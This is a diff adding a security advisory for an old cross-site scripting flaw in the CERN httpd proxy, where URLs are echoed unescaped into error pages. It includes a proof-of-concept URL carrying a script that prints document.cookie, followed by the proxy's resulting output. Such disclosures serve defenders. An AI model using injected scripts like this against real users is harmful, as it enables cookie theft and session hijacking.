@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/5447/info
+
+CERN httpd is a freely available HTTP server and HTTP proxy server available from the W3C.
+
+The httpd Proxy is vulnerable to a cross site scripting attack.
+
+The condition is present because of the way URLS are displayed in error messages. It is possible for arbitrary HTML or script code to be embedded in the error page through a maliciously constructed link. When the error is displayed, the script will be executed within the context of the proxy server's error page on the client browser. This may permit various web-based attacks including stealing cookies, etc.
+
+Accessing the following URL with the browser configured to use CERN httpd as a proxy,
+
+http://nonexistenthost.google.com/<SCRIPT>document.write(document.cookie)</SCRIPT>
+
+will cause CERN httpd Proxy to produce output like this:
+========================================================
+<HTML>
+<HEAD>
+<TITLE>Error Message</TITLE>
+</HEAD>
+<BODY>
+<H1>Fatal Error 500</H1>
+Can't Access Document: http://nonexistenthost.google.com/<SCRIPT>document.write(document.cookie)</SCRIPT>.
+<P>
+<B>Reason:</B> Can't locate remote host: nonexistenthost.google.com.
+<P>
+...
+========================================================
